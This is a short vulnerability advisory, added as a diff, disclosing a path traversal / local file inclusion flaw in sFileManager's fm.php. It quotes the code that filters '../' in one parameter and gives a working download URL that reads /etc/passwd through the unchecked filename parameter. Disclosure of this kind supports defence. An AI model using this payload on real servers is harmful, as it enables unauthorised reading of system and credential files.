@@ -1,0 +1,48 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+sFileManager <= v.24a / Local File Inclusion Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+$ Program: sFileManager
+$ Version: <= v.24a
+$ File affected: fm.php
+$ Download: http://onedotoh.sourceforge.net/
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org - www.pepelux.org
+
+----- by the author -----
+Simple File Manager (SFM) is a web based file management utility. It is designed to be 
+used by those that don't want to use ftp or SHOULD NOT use ftp. It can be dropped into 
+a specific directory and give access to that directory as well as any directory below 
+it, including those created by SFM. It can be placed in a specific directory and 
+configured to give access to other directories outside of its location (centralized). 
+SFM gives its user upload, rename, delete, directory creation as well as directory 
+navigation (within its tree limits), as well as Create New File; it also includes an 
+image viewer, text viewer and mime type downloading. 
+-------------------------
+
+
+-- BUG --
+When you click to download a file there are two params:
+
+http://www.host.com/fm.php?action=download&filename=file.txt&pathext=pub/&u=&copt=1&sortKey=0
+
+action  = file to download
+pathext = directory where the file is located
+
+
+You can't do:
+http://www.host.com/fm.php?action=download&filename=passwd&pathext=pub/../../../../etc/&u=&copt=1&sortKey=0
+
+because in fm.php:
+
+231 ... if (ereg("\.\./", $pathext)) {
+232 ...     $hack="<font color=red><b>HACK ATTEMPT - SysOp Notified</b></font><p>";
+233 ...     $pathext="";
+234 ... }
+
+
+but $action is not checked and you can do:
+http://www.host.com/fm.php?action=download&filename=../../../../../etc/passwd&pathext=pub/&u=&copt=1&sortKey=0
+
